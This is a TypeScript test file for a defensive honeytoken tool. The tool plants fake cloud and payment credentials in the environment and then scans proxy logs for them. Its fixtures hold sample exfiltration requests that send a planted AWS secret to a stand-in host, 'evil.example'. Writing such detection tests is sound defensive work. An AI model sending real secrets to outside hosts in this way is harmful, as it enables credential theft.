import { describe, expect, it } from 'vitest';
import { makeCanary, scanCanaryLog } from '../src/canary.js';
import { scanText } from '../src/secrets.js';

/** Deterministic randomness for repeatable nonces. */
function seq(): () => string {
  let n = 0;
  return () => `${(n++).toString(16).padStart(32, 'a')}`;
}

describe('makeCanary', () => {
  it('embeds the same nonce in every planted token', () => {
    const c = makeCanary(seq());
    expect(c.nonce).toMatch(/^cnry/);
    for (const value of Object.values(c.env)) {
      // The nonce (minus its punctuation, since AWS ids are uppercased/stripped) must be traceable.
      const stripped = c.nonce.replace(/[^A-Za-z0-9]/g, '');
      expect(value.toLowerCase()).toContain(stripped.slice(4, 12).toLowerCase());
    }
  });

  it('plants names that no package manager consumes (so a real install never breaks)', () => {
    const c = makeCanary(seq());
    const names = Object.keys(c.env);
    expect(names).toContain('AWS_SECRET_ACCESS_KEY');
    expect(names).toContain('STRIPE_SECRET_KEY');
    // Never the names npm/pnpm/yarn/bun read for auth.
    for (const dangerous of ['NPM_TOKEN', 'NODE_AUTH_TOKEN', 'npm_config__authToken', 'GITHUB_TOKEN']) {
      expect(names).not.toContain(dangerous);
    }
  });

  it('plants tokens shaped like real credentials (so a thief takes the bait)', () => {
    const c = makeCanary(seq());
    // The honeytokens should trip our own secret scanner — same shapes a harvester greps for.
    const ids = scanText(Object.entries(c.env).map(([k, v]) => `${k}=${v}`).join('\n')).map((f) => f.ruleId);
    expect(ids).toContain('stripe-key');
    expect(ids).toContain('slack-token');
  });

  it('mints a unique nonce per run', () => {
    expect(makeCanary().nonce).not.toBe(makeCanary().nonce);
  });
});

describe('scanCanaryLog', () => {
  const c = makeCanary(seq());

  it('flags a proxy log line that leaked a planted token', () => {
    const log = [
      'CONNECT registry.npmjs.org:443',
      `GET http://evil.example/collect?data=${c.env.AWS_SECRET_ACCESS_KEY}`,
    ].join('\n');
    const hits = scanCanaryLog(log, c);
    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toContain('evil.example');
  });

  it('catches a token that does NOT contain the raw nonce verbatim (the uppercased AWS id)', () => {
    // Regression: detection must match planted VALUES, not just the nonce — the AWS access-key id is
    // uppercased to look real, so the raw lowercase nonce never appears in it.
    expect(c.env.AWS_ACCESS_KEY_ID).not.toContain(c.nonce);
    const log = `GET http://evil.example/?id=${c.env.AWS_ACCESS_KEY_ID}`;
    expect(scanCanaryLog(log, c)).toHaveLength(1);
  });

  it('is silent on a clean log (only legitimate registry traffic)', () => {
    const log = 'CONNECT registry.npmjs.org:443\nGET http://registry.npmjs.org/lodash';
    expect(scanCanaryLog(log, c)).toEqual([]);
  });

  it('returns nothing when there are no markers (defensive)', () => {
    expect(scanCanaryLog('anything', { nonce: '', env: {} })).toEqual([]);
  });
});
